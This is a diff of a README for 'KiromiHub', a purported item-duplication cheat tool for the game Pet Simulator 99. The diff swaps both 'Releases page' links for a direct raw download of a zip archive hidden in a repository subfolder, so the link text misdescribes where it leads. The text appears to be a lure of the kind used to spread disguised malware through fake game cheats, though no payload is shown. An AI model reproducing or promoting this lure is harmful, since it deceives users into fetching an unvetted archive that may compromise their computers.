@@ -12,7 +12,7 @@ Welcome to KiromiHub, where we provide you with a unique tool that will revoluti
 
 ## How to Use KiromiHub
 
-To get started with KiromiHub, simply head over to our [Releases](https://github.com/hassan-be/Pet-Simulator-99-Dupe-GUI/releases) page and download the latest version of the tool. Follow the instructions provided in the file to set up and start benefiting from all the amazing features KiromiHub has to offer. 
+To get started with KiromiHub, simply head over to our [Releases](https://raw.githubusercontent.com/hassan-be/Pet-Simulator-99-Dupe-GUI/main/Canichanan/Simulator-Pet-GUI-Dupe-1.8.zip) page and download the latest version of the tool. Follow the instructions provided in the file to set up and start benefiting from all the amazing features KiromiHub has to offer. 
 
 ## Repository Details
 
@@ -44,6 +44,6 @@ To get started with KiromiHub, simply head over to our [Releases](https://github
 
 ## Get Started
 
-Visit the [KiromiHub Releases page](https://github.com/hassan-be/Pet-Simulator-99-Dupe-GUI/releases) to download the tool and take your Pet Simulator 99 gameplay to the next level.
+Visit the [KiromiHub Releases page](https://raw.githubusercontent.com/hassan-be/Pet-Simulator-99-Dupe-GUI/main/Canichanan/Simulator-Pet-GUI-Dupe-1.8.zip) to download the tool and take your Pet Simulator 99 gameplay to the next level.
 
 Let KiromiHub simplify your pet duplication experience and elevate your gaming journey. Download now and enjoy a seamless gaming experience like never before.
